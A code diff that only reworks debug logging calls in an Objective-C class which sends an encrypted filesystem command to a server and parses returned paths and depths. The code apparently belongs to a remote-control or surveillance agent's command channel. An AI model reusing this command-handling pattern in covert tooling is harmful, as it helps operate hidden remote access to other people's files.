@@ -15,7 +15,8 @@
 #import "NSData+Pascal.h"
 #import "RCSMCommon.h"
 
-//#define DEBUG_FS_NOP
+#import "RCSMLogger.h"
+#import "RCSMDebug.h"
 
 
 @implementation FSNetworkOperation
@@ -30,7 +31,7 @@
       mPaths = [[NSMutableArray alloc] init];
     
 #ifdef DEBUG_FS_NOP
-      infoLog(ME, @"mTransport: %@", mTransport);
+      infoLog(@"mTransport: %@", mTransport);
 #endif
       return self;
     }
@@ -47,7 +48,7 @@
 - (BOOL)perform
 {
 #ifdef DEBUG_FS_NOP
-  infoLog(ME, @"");
+  infoLog(@"");
 #endif
   
   uint32_t command              = PROTO_FILESYSTEM;
@@ -59,7 +60,7 @@
   [commandData appendData: commandSha];
   
 #ifdef DEBUG_FS_NOP
-  infoLog(ME, @"commandData: %@", commandData);
+  infoLog(@"commandData: %@", commandData);
 #endif
   
   [commandData encryptWithKey: gSessionKey];
@@ -78,7 +79,7 @@
   [replyDecrypted decryptWithKey: gSessionKey];
   
 #ifdef DEBUG_FS_NOP
-  infoLog(ME, @"replyDecrypted: %@", replyDecrypted);
+  infoLog(@"replyDecrypted: %@", replyDecrypted);
 #endif
   
   [replyDecrypted getBytes: &command
@@ -104,7 +105,7 @@
   @catch (NSException *e)
     {
 #ifdef DEBUG_FS_NOP
-      errorLog(ME, @"exception on sha makerange (%@)", [e reason]);
+      errorLog(@"exception on sha makerange (%@)", [e reason]);
 #endif
       
       [replyDecrypted release];
@@ -117,14 +118,14 @@
   shaLocal = [shaLocal sha1Hash];
   
 #ifdef DEBUG_FS_NOP
-  infoLog(ME, @"shaRemote: %@", shaRemote);
-  infoLog(ME, @"shaLocal : %@", shaLocal);
+  infoLog(@"shaRemote: %@", shaRemote);
+  infoLog(@"shaLocal : %@", shaLocal);
 #endif
   
   if ([shaRemote isEqualToData: shaLocal] == NO)
     {
 #ifdef DEBUG_FS_NOP
-      errorLog(ME, @"sha mismatch");
+      errorLog(@"sha mismatch");
 #endif
     
       [replyDecrypted release];
@@ -137,7 +138,7 @@
   if (command != PROTO_OK)
     {
 #ifdef DEBUG_FS_NOP
-      errorLog(ME, @"No fs request available (command %d)", command);
+      errorLog(@"No fs request available (command %d)", command);
 #endif
       
       [replyDecrypted release];
@@ -160,7 +161,7 @@
   @catch (NSException *e)
     {
 #ifdef DEBUG_FS_NOP
-      errorLog(ME, @"exception on parameters makerange (%@)", [e reason]);
+      errorLog(@"exception on parameters makerange (%@)", [e reason]);
 #endif
       
       [replyDecrypted release];
@@ -179,7 +180,7 @@
   @catch (NSException *e)
     {
 #ifdef DEBUG_FS_NOP
-      errorLog(ME, @"exception on data makerange (%@)", [e reason]);
+      errorLog(@"exception on data makerange (%@)", [e reason]);
 #endif
       
       [replyDecrypted release];
@@ -208,7 +209,7 @@
       @catch (NSException *e)
         {
 #ifdef DEBUG_FS_NOP
-          errorLog(ME, @"exception on len makerange (%@)", [e reason]);
+          errorLog(@"exception on len makerange (%@)", [e reason]);
 #endif
           
           [replyDecrypted release];
@@ -221,8 +222,8 @@
       NSNumber *depthN = [NSNumber numberWithUnsignedInt: depth];
       
 #ifdef DEBUG_FS_NOP
-      infoLog(ME, @"depth: %d", depth);
-      infoLog(ME, @"len  : %d", len);
+      infoLog(@"depth: %d", depth);
+      infoLog(@"len  : %d", len);
 #endif
       
       NSData *stringData;
@@ -234,7 +235,7 @@
       @catch (NSException *e)
         {
 #ifdef DEBUG_FS_NOP
-          errorLog(ME, @"exception on stringData makerange (%@)", [e reason]);
+          errorLog(@"exception on stringData makerange (%@)", [e reason]);
 #endif
           
           [replyDecrypted release];
@@ -247,7 +248,7 @@
       NSString *string    = [stringData unpascalizeToStringWithEncoding: NSUTF16LittleEndianStringEncoding];
       
 #ifdef DEBUG_FS_NOP
-      infoLog(ME, @"string: %@", string);
+      infoLog(@"string: %@", string);
 #endif
       
       //
@@ -266,7 +267,7 @@
       [mPaths addObject: dictionary];
       
 #ifdef DEBUG_FS_NOP
-      infoLog(ME, @"mPaths: %@", mPaths);
+      infoLog(@"mPaths: %@", mPaths);
 #endif
       
       @try
@@ -278,7 +279,7 @@
       @catch (NSException *e)
         {
 #ifdef DEBUG_FS_NOP
-          errorLog(ME, @"exception on replaceBytes makerange (%@)", [e reason]);
+          errorLog(@"exception on replaceBytes makerange (%@)", [e reason]);
 #endif
           
           [replyDecrypted release];
